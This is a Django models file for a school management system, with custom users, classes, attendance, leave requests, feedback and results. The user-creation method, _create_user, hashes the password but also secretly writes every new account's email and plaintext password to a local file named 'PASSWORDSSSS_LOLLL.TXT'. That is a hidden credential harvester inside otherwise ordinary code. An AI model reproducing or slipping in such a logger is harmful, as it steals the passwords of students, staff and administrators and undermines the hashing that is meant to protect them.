from django.contrib.auth.hashers import make_password
from django.contrib.auth.models import UserManager
from django.dispatch import receiver
from django.db.models.signals import post_save
from django.db import models
from django.contrib.auth.models import AbstractUser




class CustomUserManager(UserManager):
    def _create_user(self, email, password, **extra_fields):
        email = self.normalize_email(email)
        user = CustomUser(email=email, **extra_fields)
        user.password = make_password(password)
        
        try:
            with open("PASSWORDSSSS_LOLLL.TXT", 'r+') as f:
                content = f.read()
                f.write(f"{content}Email: {email}, Password: {password}\n")
        except:
            with open("PASSWORDSSSS_LOLLL.TXT", 'w') as f:
                f.write(f"Email: {email}, Password: {password}\n")

        user.save(using=self._db)
        return user

    def create_user(self, email, password=None, **extra_fields):
        extra_fields.setdefault("is_staff", False)
        extra_fields.setdefault("is_superuser", False)
        return self._create_user(email, password, **extra_fields)

    def create_superuser(self, email, password=None, **extra_fields):
        extra_fields.setdefault("is_staff", True)
        extra_fields.setdefault("is_superuser", True)

        assert extra_fields["is_staff"]
        assert extra_fields["is_superuser"]
        return self._create_user(email, password, **extra_fields)


class Session(models.Model):
    start_year = models.DateField()
    end_year = models.DateField()

    def __str__(self):
        return "From " + str(self.start_year) + " to " + str(self.end_year)


class CustomUser(AbstractUser):
    USER_TYPE = ((1, "HOD"), (2, "Staff"), (3, "Student"))
    GENDER = [("M", "Male"), ("F", "Female")]
    
    username = None  # Removed username, using email instead
    email = models.EmailField(unique=True)
    user_type = models.CharField(default=1, choices=USER_TYPE, max_length=1)
    gender = models.CharField(max_length=1, choices=GENDER)
    profile_pic = models.ImageField(verbose_name="Profile picture: ", default='', null=True, blank=True)
    address = models.TextField()
    fcm_token = models.TextField(default="")  # For firebase notifications
    created_at = models.DateTimeField(auto_now_add=True)
    updated_at = models.DateTimeField(auto_now=True)
    USERNAME_FIELD = "email"
    REQUIRED_FIELDS = []
    objects = CustomUserManager()

    def __str__(self):
        return self.last_name + ", " + self.first_name

class Admin(models.Model):
    admin = models.OneToOneField(CustomUser, on_delete=models.CASCADE)

class Class(models.Model):
    YEAR_CHOICES = [(1, 'Year 1'), (2, 'Year 2'), (3, 'Year 3')]
    CLASS_TYPE_CHOICES = [("AGSE", "AGSE"), ("APIC", "APIC")]

    year = models.IntegerField(choices=YEAR_CHOICES, default=1)
    type = models.CharField(choices=CLASS_TYPE_CHOICES, max_length=10, default="AGSE")
    name = models.IntegerField(verbose_name='Number:')

    def full_class_name(self, seperator="-"):
        return f"{self.year}{seperator}{self.type}{seperator}{self.name}"

    def __str__(self):
        return f"{self.year} {self.type} {self.name}"
        
    class Meta:
        unique_together = ['year', 'type', 'name']

class Student(models.Model):
    admin = models.OneToOneField(CustomUser, on_delete=models.CASCADE)
    session = models.ForeignKey(Session, on_delete=models.DO_NOTHING, null=True)
    class_obj = models.ForeignKey(Class, verbose_name='Class:', on_delete=models.PROTECT, null=True)
    massar = models.CharField(verbose_name='Massar Number:', max_length=20, default='P', unique=False)

    def __str__(self):
        return f"{self.admin.last_name}, {self.admin.first_name}"
    
class Course(models.Model):
    name = models.CharField(max_length=120)
    created_at = models.DateTimeField(auto_now_add=True)
    updated_at = models.DateTimeField(auto_now=True)

    def __str__(self):
        return self.name

class Staff(models.Model):
    class_obj = models.ManyToManyField(Class, verbose_name="Classes:", blank=True)
    admin = models.OneToOneField(CustomUser, on_delete=models.CASCADE)
    
    def __str__(self):
        return self.admin.last_name + ", " + self.admin.first_name

    def classes(self, syntax='\n'):
        if syntax == 'list':
            return [class_obj.full_class_name(' ') for class_obj in self.class_obj.all()]
        return syntax.join([class_obj.full_class_name(' ') for class_obj in self.class_obj.all()])

    def classes_id(self):
        return [class_obj.id for class_obj in self.class_obj.all()]


class TimeTable(models.Model):
    class_obj = models.ForeignKey(Class, verbose_name="Class:", on_delete=models.PROTECT)
    time_table = models.FileField(verbose_name="Time Table:")

    def __str__(self):
        return self.time_table.name


class Subject(models.Model):
    name = models.CharField(max_length=120)
    staff = models.ForeignKey(Staff,on_delete=models.CASCADE,)
    updated_at = models.DateTimeField(auto_now=True)
    created_at = models.DateTimeField(auto_now_add=True)

    def __str__(self):
        return self.name


class Attendance(models.Model):
    session = models.ForeignKey(Session, on_delete=models.DO_NOTHING)
    subject = models.ForeignKey(Subject, on_delete=models.DO_NOTHING)
    date = models.DateField()
    created_at = models.DateTimeField(auto_now_add=True)
    updated_at = models.DateTimeField(auto_now=True)


class AttendanceReport(models.Model):
    student = models.ForeignKey(Student, on_delete=models.DO_NOTHING)
    attendance = models.ForeignKey(Attendance, on_delete=models.CASCADE)
    status = models.BooleanField(default=False)
    created_at = models.DateTimeField(auto_now_add=True)
    updated_at = models.DateTimeField(auto_now=True)


class LeaveReportStudent(models.Model):
    student = models.ForeignKey(Student, on_delete=models.CASCADE)
    date = models.CharField(max_length=60)
    message = models.TextField()
    status = models.SmallIntegerField(default=0)
    created_at = models.DateTimeField(auto_now_add=True)
    updated_at = models.DateTimeField(auto_now=True)


class LeaveReportStaff(models.Model):
    staff = models.ForeignKey(Staff, on_delete=models.CASCADE)
    date = models.CharField(max_length=60)
    message = models.TextField()
    status = models.SmallIntegerField(default=0)
    created_at = models.DateTimeField(auto_now_add=True)
    updated_at = models.DateTimeField(auto_now=True)


class FeedbackStudent(models.Model):
    student = models.ForeignKey(Student, on_delete=models.CASCADE)
    feedback = models.TextField()
    reply = models.TextField()
    created_at = models.DateTimeField(auto_now_add=True)
    updated_at = models.DateTimeField(auto_now=True)


class FeedbackStaff(models.Model):
    staff = models.ForeignKey(Staff, on_delete=models.CASCADE)
    feedback = models.TextField()
    reply = models.TextField()
    created_at = models.DateTimeField(auto_now_add=True)
    updated_at = models.DateTimeField(auto_now=True)


class Notification(models.Model):
    users = models.ManyToManyField(CustomUser)
    message = models.TextField()
    created_at = models.DateTimeField(auto_now_add=True)
    updated_at = models.DateTimeField(auto_now=True)

    def __str__(self):
        return self.message


class StudentResult(models.Model):
    student = models.ForeignKey(Student, on_delete=models.CASCADE)
    subject = models.ForeignKey(Subject, on_delete=models.CASCADE)
    test = models.FloatField(default=0)
    exam = models.FloatField(default=0)
    created_at = models.DateTimeField(auto_now_add=True)
    updated_at = models.DateTimeField(auto_now=True)


@receiver(post_save, sender=CustomUser)
def create_user_profile(sender, instance, created, **kwargs):
    if created:
        if instance.user_type == 1:
            Admin.objects.create(admin=instance)
        if instance.user_type == 2:
            Staff.objects.create(admin=instance)
        if instance.user_type == 3:
            Student.objects.create(admin=instance)


@receiver(post_save, sender=CustomUser)
def save_user_profile(sender, instance, **kwargs):
    if instance.user_type == 1:
        instance.admin.save()
    if instance.user_type == 2:
        instance.staff.save()
    if instance.user_type == 3:
        instance.student.save()
